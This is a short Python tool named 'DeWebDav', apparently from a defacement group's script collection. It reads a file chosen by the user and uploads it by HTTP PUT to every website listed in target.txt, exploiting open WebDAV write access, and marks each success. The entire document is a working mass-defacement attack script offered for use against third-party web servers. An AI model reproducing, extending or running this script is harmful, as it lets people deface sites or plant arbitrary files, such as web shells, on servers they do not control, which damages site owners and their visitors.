# coding: utf-8

try:
    import requests
    import os.path
    import sys
except ImportError:
    exit("pip install requests...")

tampil = """
###################################################
# Script   : DeWebDav
# Author   : XXSec101
# Github   : github.com/NaInSec
# Website  : nainsec.pro.net
# Desc     : Script by XXSec101, Base On WhiteDeface Script.
################################################### """

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(prompt):
    user_input = ''
    if sys.version_info.major > 2:
        user_input = input(prompt)
    else:
        user_input = raw_input(prompt)

    return str(user_input)

def auto(script, target_file="target.txt"):
    with open(script, "r", encoding="utf-8") as script_file:
        script_content = script_file.read().encode('utf-8')

    with open(target_file, "r") as target:
        target_websites = target.readlines()
        s = requests.Session()
        print("Script Upload To %d Website"%(len(target_websites)))
        for web in target_websites:
            try:
                site = web.strip()
                if not (site.startswith("http://") or site.startswith("https://")):
                    site = "http://" + site
                req = s.put(site + "/" + script, data=script_content)
                if req.status_code < 200 or req.status_code >= 250:
                    print(m + "[" + b + " -" + m + " ] %s/%s" % (site, script))
                else:
                    print(m + "[" + h + " +" + m + " ] %s/%s" % (site, script))

            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print()
                exit()

def main(banner):
    print(banner)
    while True:
        try:
            script_name = x("Please Input Script Name :~# ")
            if not os.path.isfile(script_name):
                print("Script '%s' Not Found"%(script_name))
                continue
            else:
                break
        except KeyboardInterrupt:
            print()
            exit()

    auto(script_name)

if __name__ == "__main__":
    main(tampil)
